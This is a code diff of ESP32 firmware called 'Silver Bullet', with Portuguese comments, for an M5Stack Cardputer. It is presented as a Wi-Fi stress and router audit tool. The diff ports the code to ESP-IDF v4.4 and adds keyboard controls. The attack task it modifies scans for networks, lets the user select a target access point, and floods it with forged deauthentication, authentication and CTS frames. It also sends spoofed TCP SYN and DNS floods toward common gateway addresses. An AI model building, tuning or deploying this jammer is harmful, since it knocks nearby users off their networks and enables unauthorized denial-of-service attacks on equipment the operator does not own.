@@ -1,14 +1,7 @@
 /**
  * @file silver_bullet.cpp
  * @brief Silver Bullet - Ferramenta Avançada de Estresse Wi-Fi e Auditoria de CPEs
- * @hardware ESP32-S3 (M5Stack Cardputer) / ESP32 WROOM
- * * * Correções Aplicadas nesta Versão (Refatoração de Concorrência e Memória):
- * - [Race Condition de Barramento Resolvido]: Variável atômica de PPS substituída por buffer local com descarregamento 'memory_order_relaxed'.
- * - [Proteção I2C/SPI]: Implementação de 'display_mutex' para evitar screen tearing e sobreposição entre cores.
- * - [Strict Aliasing Fix]: Função 'fast_l4_checksum' reescrita com 'memcpy' para evitar falhas silenciosas de otimização do GCC (-O2/-Os).
- * - [Proteção Null Pointer]: Blindagem da função de análise de MAC (OUI) contra corrupção do Kernel.
- * - [Sincronização de Scan]: Implementação de 'scan_mutex' protegendo o array de alvos de sobrescritas em tempo de execução.
- * - [Otimização Tx Buffer]: Reajuste matemático no Yielding para evitar picos de Syscall no esgotamento da fila DMA.
+ * @hardware ESP32-S3 (M5Stack Cardputer) - ESP-IDF v4.4
  */
 
 #include <M5Unified.h>
@@ -22,9 +15,9 @@
 #include <atomic>
 #include <lwip/def.h> 
 #include <esp_heap_caps.h>
-#include "driver/temperature_sensor.h"
+#include "driver/temp_sensor.h" 
 #include "esp_random.h"
-#include "esp_mac.h"
+#include "esp_log.h" 
 
 // ===================================================================
 // 1. ESTRUTURAS DE PACOTES (OTIMIZADAS PARA ACESSO DIRETO DMA)
@@ -105,7 +98,6 @@ std::atomic<bool> thermal_lock{false};
 std::atomic<uint32_t> pacotes_enviados_segundo{0};
 std::atomic<uint32_t> pps_atual{0};
 uint32_t prng_state = 1; 
-temperature_sensor_handle_t temp_sensor = NULL;
 
 SemaphoreHandle_t display_mutex = NULL;
 SemaphoreHandle_t scan_mutex = NULL;
@@ -133,7 +125,7 @@ enum FabricanteCPE {
 };
 
 FabricanteCPE identificar_fabricante(const uint8_t* mac) {
-    if (mac == nullptr) return FABRICANTE_GENERICO; // Fix: Kernel Panic Prevention
+    if (mac == nullptr) return FABRICANTE_GENERICO; 
 
     if ((mac[0] == 0x4C && mac[1] == 0x5E && mac[2] == 0x0C) || 
         (mac[0] == 0x00 && mac[1] == 0x0C && mac[2] == 0x42) || 
@@ -185,7 +177,6 @@ inline uint16_t fast_ip_checksum(IpHeader *ip) {
     return ~acc;
 }
 
-// Fix: Tratamento Strict Aliasing usando cópia segura em bytes (memcpy)
 inline uint16_t fast_l4_checksum(IpHeader *ip, void *l4_hdr, size_t l4_len, uint8_t *payload, size_t payload_len) {
     PseudoHeader psd;
     memcpy(psd.src_ip, ip->ip_src, 4); memcpy(psd.dest_ip, ip->ip_dest, 4);
@@ -251,14 +242,28 @@ void escanear_redes() {
         xSemaphoreGive(display_mutex);
     }
     
-    esp_wifi_set_mode(WIFI_MODE_STA);
-    wifi_scan_config_t scan_config = {}; scan_config.show_hidden = true;
-    esp_wifi_scan_start(&scan_config, true); 
+    esp_wifi_set_mode(WIFI_MODE_STA); 
+
+    wifi_scan_config_t scan_config;
+    memset(&scan_config, 0, sizeof(scan_config)); 
+    scan_config.show_hidden = true;
+    scan_config.scan_type = WIFI_SCAN_TYPE_ACTIVE;
+    
+    esp_err_t err = esp_wifi_scan_start(&scan_config, true); 
+    
+    if (err != ESP_OK) {
+        if(xSemaphoreTake(display_mutex, portMAX_DELAY)) {
+            M5.Display.setTextColor(TFT_RED, TFT_BLACK);
+            M5.Display.printf("ERRO RADIO: %d\n", err);
+            xSemaphoreGive(display_mutex);
+        }
+        vTaskDelay(pdMS_TO_TICKS(2000));
+    }
     
     if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
+        esp_wifi_scan_get_ap_num(&total_alvos);
         uint16_t max_aps = MAX_ALVOS; 
         esp_wifi_scan_get_ap_records(&max_aps, alvos_encontrados);
-        esp_wifi_scan_get_ap_num(&total_alvos);
         if (total_alvos > MAX_ALVOS) total_alvos = MAX_ALVOS;
         xSemaphoreGive(scan_mutex);
     }
@@ -270,11 +275,16 @@ void desenhar_menu() {
     if(xSemaphoreTake(display_mutex, portMAX_DELAY)) {
         M5.Display.clear(); M5.Display.setCursor(0, 0); M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
         
+        const char* modo_str = "AUTO";
+        if(modo_ativo.load() == MODO_MANUAL_L2) modo_str = "L2";
+        else if(modo_ativo.load() == MODO_MANUAL_L3) modo_str = "L3";
+        else if(modo_ativo.load() == MODO_MANUAL_CTS) modo_str = "CTS";
+
         if (thermal_lock.load()) {
             M5.Display.setTextColor(TFT_RED, TFT_BLACK);
-            M5.Display.printf("⚡ PWR: ECO [THERMAL LOCK]\n");
+            M5.Display.printf("⚡ PWR: ECO | MOD: %s\n", modo_str);
         } else {
-            M5.Display.printf("⚡ PWR: %s | [A] = Auto\n", tx_power_max.load() ? "MAX (20dBm)" : "ECO (10dBm)");
+            M5.Display.printf("⚡ PWR: %s | MOD: %s\n", tx_power_max.load() ? "MAX" : "ECO", modo_str);
         }
         
         M5.Display.drawLine(0, 15, 240, 15, TFT_DARKGREY); M5.Display.setCursor(0, 20);
@@ -314,7 +324,7 @@ void task_display(void *pvParameters) {
                      M5.Display.println("ERRO CRITICO: FALHA DMA!"); 
                      xSemaphoreGive(display_mutex);
                      vTaskDelay(pdMS_TO_TICKS(5000));
-                     esp_restart(); // Fix: Reinício limpo em falha invés de travamento eterno
+                     esp_restart(); 
                 }
 
                 if (!alvo_perdido.load()) {
@@ -328,20 +338,18 @@ void task_display(void *pvParameters) {
                     M5.Display.printf("⚔️ ALVO: %s\n", alvo_ssid);
                     
                     float tsens_out = 0.0;
-                    if (temp_sensor != NULL) {
-                        esp_err_t res = temperature_sensor_get_celsius(temp_sensor, &tsens_out);
-                        
-                        if (res == ESP_OK && tsens_out > 0.0 && tsens_out < 100.0) {
-                            if (tsens_out > 75.0 && !thermal_lock.load()) { 
-                                thermal_lock.store(true); 
-                                tx_power_max.store(false); 
-                                flag_update_config.store(true); 
-                            } 
-                            else if (tsens_out < 65.0 && thermal_lock.load()) { 
-                                thermal_lock.store(false); 
-                                tx_power_max.store(tx_power_max_user.load()); 
-                                flag_update_config.store(true); 
-                            }
+                    esp_err_t res = temp_sensor_read_celsius(&tsens_out);
+                    
+                    if (res == ESP_OK && tsens_out > 0.0 && tsens_out < 100.0) {
+                        if (tsens_out > 75.0 && !thermal_lock.load()) { 
+                            thermal_lock.store(true); 
+                            tx_power_max.store(false); 
+                            flag_update_config.store(true); 
+                        } 
+                        else if (tsens_out < 65.0 && thermal_lock.load()) { 
+                            thermal_lock.store(false); 
+                            tx_power_max.store(tx_power_max_user.load()); 
+                            flag_update_config.store(true); 
                         }
                     }
                     
@@ -352,11 +360,13 @@ void task_display(void *pvParameters) {
 
                     M5.Display.fillRect(0, 40, 320, 60, TFT_BLACK);
                     M5.Display.setCursor(0, 40); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
-                    if(scanner_pausa_ataque.load()) M5.Display.printf("> RASTREANDO FUGA (CH PURSUIT)...\n");
+                    if(scanner_pausa_ataque.load()) M5.Display.printf("> RASTREANDO FUGA...\n");
                     else M5.Display.printf("> %s\n", get_nome_modo());
                     
                     M5.Display.setCursor(0, 60); M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
-                    M5.Display.printf(">> INJETANDO: %lu PPS <<\n",  (uint32_t)pps_atual.load());
+                    
+                    // CORREÇÃO DO %lu para %u para o compilador v4.4
+                    M5.Display.printf(">> INJETANDO: %u PPS <<\n",  (unsigned int)pps_atual.load());
                 } else {
                     M5.Display.fillRect(0, 40, 320, 60, TFT_BLACK); 
                     M5.Display.setCursor(0, 40); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK); M5.Display.printf("⚠️ ALVO PERDIDO\n");
@@ -400,7 +410,7 @@ void task_monitoramento(void *pvParameters) {
 }
 
 // ===================================================================
-// 6. MOTOR DE INJEÇÃO DMA E INTELIGÊNCIA APLICADA (CORE 0)
+// 6. MOTOR DE INJEÇÃO (DESBLOQUEADO PARA O V4.4)
 // ===================================================================
 
 void task_ataque(void *pvParameters) {
@@ -410,10 +420,6 @@ void task_ataque(void *pvParameters) {
     CtsPacket* cts = (CtsPacket*) heap_caps_malloc(sizeof(CtsPacket), MALLOC_CAP_DMA);
     
     if (!pkt || !deauth || !auth || !cts) { 
-        if(pkt) heap_caps_free(pkt);
-        if(deauth) heap_caps_free(deauth);
-        if(auth) heap_caps_free(auth);
-        if(cts) heap_caps_free(cts);
         erro_memoria_critico.store(true); vTaskDelete(NULL); 
     }
     
@@ -437,8 +443,7 @@ void task_ataque(void *pvParameters) {
     uint8_t mac_alvo_local[6] = {0};
     
     uint8_t dns_query_base[] = {
-        0x00, 0x00, 
-        0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+        0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
         0x06, 'g', 'o', 'o', 'g', 'l', 'e', 0x03, 'c', 'o', 'm', 0x00, 
         0x00, 0x01, 0x00, 0x01  
     };
@@ -499,7 +504,6 @@ void task_ataque(void *pvParameters) {
                 }
             }
             
-            // Fix: Contador primitivo L1 Cache (Evita Race Condition no Barramento do ESP32-S3)
             uint32_t local_pps = 0; 
 
             if (atirar_l2) {
@@ -510,17 +514,13 @@ void task_ataque(void *pvParameters) {
                     auth->seq_ctrl = (fast_rand() & 0xFFF) << 4; deauth->seq_ctrl = (fast_rand() & 0xFFF) << 4;
                     deauth->reason_code = reason_codes[fast_rand() % 5];
                     
-                    if (esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(DeauthPacket), false) == ESP_ERR_NO_MEM) { vTaskDelay(pdMS_TO_TICKS(1)); break; }
-                    else local_pps++;
-                    
-                    if (esp_wifi_80211_tx(WIFI_IF_STA, auth, sizeof(AuthPacket), false) == ESP_ERR_NO_MEM) { vTaskDelay(pdMS_TO_TICKS(1)); break; }
-                    else local_pps++;
+                    if(esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(DeauthPacket), false) == ESP_OK) local_pps++;
+                    if(esp_wifi_80211_tx(WIFI_IF_STA, auth, sizeof(AuthPacket), false) == ESP_OK) local_pps++;
                 }
             }
 
             if (atirar_cts) {
-                if (esp_wifi_80211_tx(WIFI_IF_STA, cts, sizeof(CtsPacket), false) == ESP_ERR_NO_MEM) { vTaskDelay(pdMS_TO_TICKS(1)); }
-                else local_pps++;
+                if(esp_wifi_80211_tx(WIFI_IF_STA, cts, sizeof(CtsPacket), false) == ESP_OK) local_pps++;
             }
 
             if (atirar_l3) {
@@ -547,20 +547,15 @@ void task_ataque(void *pvParameters) {
                     if (is_tcp) {
                         TcpHeader* tcp = (TcpHeader*)pkt->l4_and_payload;
                         size_t t_payload = 0; 
-
                         pkt->ip.protocol = 6; 
                         
                         int gw_idx = fast_rand() % 5;
                         pkt->ip.ip_dest[0] = common_gateways[gw_idx][0]; pkt->ip.ip_dest[1] = common_gateways[gw_idx][1]; 
                         pkt->ip.ip_dest[2] = common_gateways[gw_idx][2]; pkt->ip.ip_dest[3] = common_gateways[gw_idx][3]; 
                         
-                        tcp->src_port = htons(1024 + (fast_rand() % 60000)); 
-                        tcp->dest_port = htons(porta_alvo); 
-                        tcp->seq_num = fast_rand(); tcp->ack_num = 0;
-                        
-                        tcp->data_offset_res = (6 << 4); 
-                        tcp->flags = 0x02; 
-                        tcp->window_size = htons(5840); tcp->urgent_ptr = 0;
+                        tcp->src_port = htons(1024 + (fast_rand() % 60000)); tcp->dest_port = htons(porta_alvo); 
+                        tcp->seq_num = fast_rand(); tcp->ack_num = 0; tcp->data_offset_res = (6 << 4); 
+                        tcp->flags = 0x02; tcp->window_size = htons(5840); tcp->urgent_ptr = 0;
                         
                         uint8_t* tcp_options = pkt->l4_and_payload + sizeof(TcpHeader);
                         tcp_options[0] = 0x02; tcp_options[1] = 0x04; tcp_options[2] = 0x05; tcp_options[3] = 0xB4;
@@ -609,11 +604,9 @@ void task_ataque(void *pvParameters) {
                         
                         size_t t_payload = sizeof(dns_query_base);
                         memcpy(payload, dns_query_base, t_payload);
-                        payload[0] = (uint8_t)(fast_rand() & 0xFF); 
-                        payload[1] = (uint8_t)(fast_rand() & 0xFF);
+                        payload[0] = (uint8_t)(fast_rand() & 0xFF); payload[1] = (uint8_t)(fast_rand() & 0xFF);
 
                         pkt->ip.protocol = 17; 
-                        
                         int gw_idx = fast_rand() % 5;
                         pkt->ip.ip_dest[0] = common_gateways[gw_idx][0]; pkt->ip.ip_dest[1] = common_gateways[gw_idx][1]; 
                         pkt->ip.ip_dest[2] = common_gateways[gw_idx][2]; pkt->ip.ip_dest[3] = common_gateways[gw_idx][3];
@@ -632,19 +625,14 @@ void task_ataque(void *pvParameters) {
                         udp->checksum = (calc_chk_dns == 0x0000) ? 0xFFFF : calc_chk_dns;
                     }
                     
-                    if (esp_wifi_80211_tx(WIFI_IF_STA, pkt, t_injecao, false) == ESP_ERR_NO_MEM) {
-                        vTaskDelay(pdMS_TO_TICKS(1)); 
-                        break; 
-                    }
-                    else local_pps++;
+                    if(esp_wifi_80211_tx(WIFI_IF_STA, pkt, t_injecao, false) == ESP_OK) local_pps++;
                 }
             }
             
-            // Fix: Atualização atômica isolada e relaxada no final do laço (Evita Bottleneck)
             if (local_pps > 0) pacotes_enviados_segundo.fetch_add(local_pps, std::memory_order_relaxed);
+            else vTaskDelay(pdMS_TO_TICKS(1)); 
 
             iteracao_yield++; 
-            // Fix: Adaptação matemática do yield para respeitar o tamanho da fila DMA
             if (iteracao_yield % 8 == 0) vTaskDelay(pdMS_TO_TICKS(1)); 
         } else {
             config_radio_aplicada = false; vTaskDelay(pdMS_TO_TICKS(100)); 
@@ -653,56 +641,101 @@ void task_ataque(void *pvParameters) {
 }
 
 // ===================================================================
-// 7. ENTRADA PRINCIPAL E CONTROLES (APP MAIN)
+// 7. INICIALIZAÇÃO I2C E CONTROLES (TECLADO)
 // ===================================================================
 
+#define TCA8418_ADDR 0x34
+#define TCA8418_KP_GPIO1 0x1D
+#define TCA8418_KP_GPIO2 0x1E
+#define TCA8418_KP_GPIO3 0x1F
+#define TCA8418_CFG 0x01
+#define TCA8418_KEY_LCK_EC 0x03
+#define TCA8418_KEY_EVENT_A 0x04
+
+void inicializar_teclado() {
+    M5.In_I2C.writeRegister8(TCA8418_ADDR, TCA8418_KP_GPIO1, 0xFF, 400000);
+    M5.In_I2C.writeRegister8(TCA8418_ADDR, TCA8418_KP_GPIO2, 0xFF, 400000);
+    M5.In_I2C.writeRegister8(TCA8418_ADDR, TCA8418_KP_GPIO3, 0x03, 400000);
+    M5.In_I2C.writeRegister8(TCA8418_ADDR, TCA8418_CFG, 0x00, 400000); 
+    ESP_LOGI("TECLADO", "TCA8418 Inicializado com sucesso!");
+}
+
 void task_controles(void *pvParameters) {
+    inicializar_teclado();
+    
     while (true) {
         M5.update(); 
-        if (estado_atual.load() == ESTADO_SELECIONAR) {
-            if (total_alvos > 0) {
-                if (M5.BtnA.wasPressed()) {
-                    alvo_selecionado = (alvo_selecionado + 1) % total_alvos; 
-                    desenhar_menu(); 
-                }
-                if (M5.BtnA.pressedFor(1000)) {
-                    uint8_t ch = 1;
-                    if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
-                        ch = alvos_encontrados[alvo_selecionado].primary;
-                        xSemaphoreGive(scan_mutex);
+        
+        uint8_t ec = M5.In_I2C.readRegister8(TCA8418_ADDR, TCA8418_KEY_LCK_EC, 400000);
+        uint8_t count = ec & 0x0F; 
+        
+        while (count > 0) {
+            uint8_t event = M5.In_I2C.readRegister8(TCA8418_ADDR, TCA8418_KEY_EVENT_A, 400000);
+            bool pressed = (event & 0x80) != 0;
+            uint8_t keycode = event & 0x7F; 
+            
+            if (pressed) {
+                ESP_LOGW("TECLADO", ">>> TECLA PRESSIONADA! ID: %d <<<", keycode);
+                
+                if (estado_atual.load() == ESTADO_SELECIONAR && total_alvos > 0) {
+                    if (keycode == 58) { 
+                        alvo_selecionado = (alvo_selecionado + 1) % total_alvos; 
+                        desenhar_menu();
                     }
-                    canal_atual_alvo.store(ch); 
-                    analisar_alvo_automaticamente(alvo_selecionado); 
-                    modo_ativo.store(MODO_AUTOMATICO); 
-                    if(xSemaphoreTake(display_mutex, portMAX_DELAY)) {
-                        M5.Display.clear(); 
-                        xSemaphoreGive(display_mutex);
+                    else if (keycode == 67) { 
+                        uint8_t ch = 1;
+                        if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
+                            ch = alvos_encontrados[alvo_selecionado].primary;
+                            xSemaphoreGive(scan_mutex);
+                        }
+                        canal_atual_alvo.store(ch); 
+                        analisar_alvo_automaticamente(alvo_selecionado); 
+                        modo_ativo.store(MODO_AUTOMATICO); 
+                        
+                        if(xSemaphoreTake(display_mutex, portMAX_DELAY)) { M5.Display.clear(); xSemaphoreGive(display_mutex); }
+                        flag_update_config.store(true); estado_atual.store(ESTADO_ATIRAR);
                     }
-                    flag_update_config.store(true); 
-                    estado_atual.store(ESTADO_ATIRAR);
-                    while(M5.BtnA.isPressed()) { M5.update(); vTaskDelay(10); }
                 }
-            } else if (M5.BtnA.wasPressed()) {
-                escanear_redes(); desenhar_menu();
+                else if (estado_atual.load() == ESTADO_ATIRAR) {
+                    if (keycode == 97) { 
+                        alvo_perdido.store(false); 
+                        estado_atual.store(ESTADO_SELECIONAR); 
+                        escanear_redes(); 
+                        desenhar_menu();
+                    }
+                }
             }
-        } 
-        else if (estado_atual.load() == ESTADO_ATIRAR) {
+            count--;
+        }
+        
+        // BACKUP: Botão lateral G0
+        if (estado_atual.load() == ESTADO_SELECIONAR && total_alvos > 0) {
+            if (M5.BtnA.wasPressed()) { alvo_selecionado = (alvo_selecionado + 1) % total_alvos; desenhar_menu(); }
             if (M5.BtnA.pressedFor(1000)) {
-                alvo_perdido.store(false); 
-                estado_atual.store(ESTADO_SELECIONAR); 
-                escanear_redes(); 
-                desenhar_menu();
-                while(M5.BtnA.isPressed()) { M5.update(); vTaskDelay(10); }
+                uint8_t ch = 1;
+                if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) { ch = alvos_encontrados[alvo_selecionado].primary; xSemaphoreGive(scan_mutex); }
+                canal_atual_alvo.store(ch); analisar_alvo_automaticamente(alvo_selecionado); modo_ativo.store(MODO_AUTOMATICO); 
+                if(xSemaphoreTake(display_mutex, portMAX_DELAY)) { M5.Display.clear(); xSemaphoreGive(display_mutex); }
+                flag_update_config.store(true); estado_atual.store(ESTADO_ATIRAR);
+                while(M5.BtnA.isPressed()) { M5.update(); vTaskDelay(10); } 
+            }
+        } else if (estado_atual.load() == ESTADO_ATIRAR) {
+            if (M5.BtnA.pressedFor(1000)) {
+                alvo_perdido.store(false); estado_atual.store(ESTADO_SELECIONAR); escanear_redes(); desenhar_menu();
+                while(M5.BtnA.isPressed()) { M5.update(); vTaskDelay(10); } 
             }
         }
         vTaskDelay(pdMS_TO_TICKS(50)); 
     }
 }
 
+// ===================================================================
+// 8. APP MAIN
+// ===================================================================
+
 extern "C" void app_main(void) {
     auto cfg = M5.config(); M5.begin(cfg); M5.Display.setRotation(1); M5.Display.setTextSize(1.5);
     
-    // Inicia Mutexes
     display_mutex = xSemaphoreCreateMutex();
     scan_mutex = xSemaphoreCreateMutex();
     
@@ -717,16 +750,21 @@ extern "C" void app_main(void) {
     
     wifi_init_config_t wifi_cfg = WIFI_INIT_CONFIG_DEFAULT();
     esp_wifi_init(&wifi_cfg); 
-    esp_wifi_set_storage(WIFI_STORAGE_RAM); esp_wifi_set_mode(WIFI_MODE_STA);
-    esp_wifi_start(); esp_wifi_set_ps(WIFI_PS_NONE); 
+    esp_wifi_set_storage(WIFI_STORAGE_RAM); 
+    esp_wifi_set_mode(WIFI_MODE_STA);
+    esp_wifi_start(); 
+    esp_wifi_set_ps(WIFI_PS_NONE); 
     
-    temperature_sensor_config_t ts_cfg = TEMPERATURE_SENSOR_CONFIG_DEFAULT(20, 100);
-    if (temperature_sensor_install(&ts_cfg, &temp_sensor) == ESP_OK) temperature_sensor_enable(temp_sensor);
+    // Inicialização do Sensor de Temperatura no ESP-IDF v4.4
+    temp_sensor_config_t temp_sensor = TSENS_CONFIG_DEFAULT();
+    temp_sensor_set_config(temp_sensor);
+    temp_sensor_start();
 
     xTaskCreatePinnedToCore(task_ataque, "ataque", 4096, NULL, 10, NULL, 0); 
     xTaskCreatePinnedToCore(task_monitoramento, "monitor", 4096, NULL, 1, NULL, 1); 
     xTaskCreatePinnedToCore(task_display, "display", 4096, NULL, 1, NULL, 1); 
     xTaskCreatePinnedToCore(task_controles, "controles", 4096, NULL, 5, NULL, 1); 
 
+    vTaskDelay(pdMS_TO_TICKS(1000)); 
     escanear_redes(); desenhar_menu();
 }
